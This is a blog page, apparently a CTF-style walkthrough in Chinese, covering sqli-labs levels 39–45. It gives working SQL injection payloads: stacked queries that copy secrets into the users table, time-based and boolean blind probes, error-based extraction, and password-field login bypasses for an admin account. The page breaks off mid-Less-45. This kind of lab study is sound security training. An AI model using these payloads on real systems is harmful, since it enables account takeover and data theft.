@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/11/01/security/range/[sqli-labs-master] - page_3/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Sqli-Labs-Master] - Page_3">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/11/01/Security/Range/[Sqli-Labs-Master]%20-%20Page_3/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-31T17:06:00.000Z">
+<meta property="article:modified_time" content="2023-10-31T17:06:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            [Sqli-Labs-Master] - Page_3 -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail-2.jpg" alt="[Sqli-Labs-Master] - Page_3" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">[Sqli-Labs-Master] - Page_3</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-01 01:06</span>
+        <span class="mobile">2023-11-01 01:06</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-01 01:06</span>
+            <span class="mobile">2023-11-01 01:06</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/Range/">Range</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Sqli-Labs-Page-3"><a href="#Sqli-Labs-Page-3" class="headerlink" title="Sqli-Labs-Page_3"></a>Sqli-Labs-Page_3</h1><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>无引号包裹的堆叠注入，需要已知当前表、与部分字段的名称信息，本关有报错回显，可以直接报错注入出部分信息再堆叠注入（其实也可以直接报错注入就出了 &#x3D; &#x3D;），payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>; replace into <span class="title function_ invoke__">users</span> (id,username,password) <span class="title function_ invoke__">values</span> (<span class="number">56</span>,(select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">1</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8), (select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">13</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8));</span><br></pre></td></tr></table></figure></div>
+
+<p>直接查询 id 为 56 的记录即可获得完整 secret。</p>
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>单引号与一层括号包裹的无错误回显的堆叠注入。满足盲注条件 ，可以先用盲注获取部分信息再堆叠注入快速获取其他信息。</p>
+<p>起初没想到有一层括号，输入 payload 时没有任何查询结果，说明第一个语句就执行失败了：<code>1&#39;;</code> 部分是不对的，外应该有一层括号。 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;); replace into security.users (id,username,password) values (127,(select mid(secret_FPMB,1,12) from challenges.5idc4x45h8), (select mid(secret_FPMB,13,12) from challenges.5idc4x45h8));</span></span><br></pre></td></tr></table></figure></div>
+
+<p>结果在 <code>id=127</code> 处。</p>
+<hr>
+<p>本关源文件中提供有登陆的接口，登陆成功后提供了密码修改功能，甚至提供了一个注册用户的接口。实际上的注入点还是之前二次注入的注入点。（Less-24 的源码文件）</p>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>无引号包裹无报错回显的堆叠注入，可以结合布尔盲注进行，payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;replace into security.<span class="title function_ invoke__">users</span> (id,username,password) <span class="title function_ invoke__">values</span> (<span class="number">58</span>,(select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">1</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8), (select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">13</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8));</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>用户名经测试无注入漏洞。看源码后发现输入内容被转义了。尝试宽字节注入发现编码非宽字节编码，失败。</p>
+<hr>
+<p>密码存在注入点，可以利用时间盲注，PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27; or sleep(1) or &#x27;</span><span class="number">0</span>&amp;login_user=<span class="number">123</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></div>
+
+<p>PoC-Plus：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27; or if(mid((select database()),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(0.1),0) or &#x27;</span><span class="number">0</span>&amp;login_user=<span class="number">123</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></div>
+
+<p>或者布尔盲注，PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27; or if(mid((select database()),1,1)=&#x27;</span>s<span class="string">&#x27;,1,0);&amp;login_user=aaa&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<p>盲注正确时返回登陆成功页面，失败时返回登录失败页面。</p>
+<hr>
+<p>利用该注入点可以直接登录指定账号，如”admin”：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; and username=&#x27;</span>admin<span class="string">&#x27;;&amp;login_user=aaa&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<p>真正控制登录用户名的是 <code>username</code> 。因为 <code>password</code> 在逻辑表达式中的位置在 <code>username</code> 后面，由于 and 与 or 的运算特性，需要在后面再次指定 <code>username</code> 并以此为准。</p>
+<p>该 payload 同样证明此处有堆叠注入漏洞，<code>;</code> 会分割语句并使后方的语法错误不影响第一句查询语句正确执行，效果同注释符。此处体现出该效果说明支持多语句查询，存在堆叠注入。</p>
+<p>测试发现后端依然不读取后续语句的结果，时间盲注在后续语句中无效（语句本体倒是有效）。由于登陆后能看到明文的用户名，考虑将想查看的内容写入到用户名中，然后利用特殊的语句登录到用户名为指定内容的账户，查看其内容。</p>
+<p>借助前面几关写入的新用户，假设我们已经插入了一个用户名为 secret 前 12 个字符的用户，登录到用户名为 secret 的前 12 个字符内容的 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; and username=mid((select secret_FPMB from challenges.5idc4x45h8),1,12);&amp;login_user=dumb&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<p>以此类推即可获取到完整的 secret 内容。</p>
+<hr>
+<p>修改密码处无注入点。</p>
+<hr>
+<p>查看源码发现，修改密码时的用户名未经过转义处理，理论上有一个特殊的用户名可以实现二次注入。本关原本未开放注册接口，但由于登录处的密码存在堆叠注入，可以手动插入一个带特殊用户名的用户，因此依然可以实现二次注入。但这没什么意义，堆叠注入能做的比二次注入更多。</p>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>登录错误有报错回显，单引号与一层括号包裹。用户名处应该是被转义处理了，密码处存在单引号，有注入漏洞。由于有报错回显，可以考虑直接报错注入：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select secret_FPMB from challenges.5idc4x45h8),0x7e)) or &#x27;</span><span class="number">0</span><span class="operator">&amp;</span>login_user<span class="operator">=</span>dumb<span class="operator">&amp;</span>mysubmit<span class="operator">=</span>Login</span><br></pre></td></tr></table></figure></div>
+
+<p>堆叠注入思路也大体类似于 Less-42，可以直接尝试登录带敏感信息的账户：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or &#x27;</span><span class="number">1</span><span class="string">&#x27; and username=mid((select secret_FPMB from challenges.5idc4x45h8),1,12);&amp;login_user=dumb&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>修改密码处亦无注入点，其用户名同样存在二次注入点。</p>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>登录密码处存在注入点，单引号包裹，延时注入 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=dumb%<span class="number">27</span><span class="keyword">or</span> <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);&amp;login_user=dumb%<span class="number">27</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></div>
+
+<p>直接尝试登录敏感账户：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; and username=mid((select secret_FPMB from challenges.5idc4x45h8),1,12);&amp;login_user=dumb&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<p>成功。</p>
+<hr>
+<p>看了一眼源码，没什么特殊的测试点，和前面几关基本一致。</p>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>登录接口用户名无注入点，密码存在注入漏洞，单引号与一层括号包裹。堆叠注入与时间盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27;) or sleep(5);&amp;login_user=dumb&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>测试本关 PoC 时，发现两类不同的 payload，一种可以直接登录，而另一种不行。</p>
+<ol>
+<li><p>可以直接登录任何账户（用户名合法）的 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27; or sleep(1) or &#x27;</span><span class="number">0</span>&amp;login_user=admin&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></div>
+
+<p>拼接到查询语句中后为：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>(<span class="string">&#x27;admin&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>由于 <code>password=&#39;admin&#39;</code> ，<code>(&#39;0&#39; or sleep(1) or &#39;0&#39;)=0</code> ，<code>&#39;admin&#39;=0</code> 恒成立，因此可以查询成功。</p>
+<p>此时该 payload 要想起作用必须要求 login_user 即 username 为合法值。</p>
+<hr>
+<p>该 payload 的另一大特点是，它不需要知道可控参数周围有无括号。</p>
+</li>
+<li><p>无法直接登录的 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27;) or sleep(1);&amp;login_user=admin&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<p>拼接后：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>(<span class="string">&#x27;admin&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;0&#x27;</span>) <span class="keyword">or</span> sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>该 payload 优点在于可以利用到堆叠注入，证明分号的可用性，同时完成延时，证明两类注入的可行性，但对于登录没有帮助。且他不需要用户名处返回 true 也能保证后续的延时执行。不如说由于 or 的短路性质，其前面的语句 <code>username=&#39;&#39; and password=(&#39;&#39;)</code> 必须为 false，该延时函数才会执行。</p>
+<p>经测试以上结论是正确的，PoC：</p>
